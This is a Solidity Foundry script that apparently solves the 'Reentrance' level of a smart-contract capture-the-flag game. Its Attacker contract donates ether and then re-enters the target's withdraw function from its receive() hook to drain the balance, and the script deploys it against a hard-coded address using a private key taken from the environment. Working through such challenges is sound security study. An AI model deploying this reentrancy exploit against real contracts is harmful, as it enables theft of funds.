// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.20;

import{Script,console} from "forge-std/Script.sol";
import{Reentrance} from "../src/Level10.sol";

/** drain the funds using the Attacker contract */
contract Attacker{
    Reentrance level10=Reentrance(payable(0x32C8d06B3856D15fbFE66B4d2EF6976Fe74E910E));
    constructor() payable{
        //donate 0.001 ether
        level10.donate{value:0.001 ether}(address(this));
    }

    function withdraw() external{
        level10.withdraw(0.001 ether);
        
        (bool success,)=msg.sender.call{value:0.002 ether}(""); //sending the ether back to msg.sender
        console.log("transferred 0.002 ether to self");
    }


    receive() external payable{
        level10.withdraw(msg.value);
    }

    
}
contract Level10Solution is Script{
        Reentrance level10=Reentrance(payable(0x32C8d06B3856D15fbFE66B4d2EF6976Fe74E910E));
        
        function run() external{
            console.log("contract balance",address(level10).balance);
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            Attacker attacker=new Attacker{value:0.0013 ether}();  //sending initial contract balance
            attacker.withdraw();
            vm.stopBroadcast();
        }
}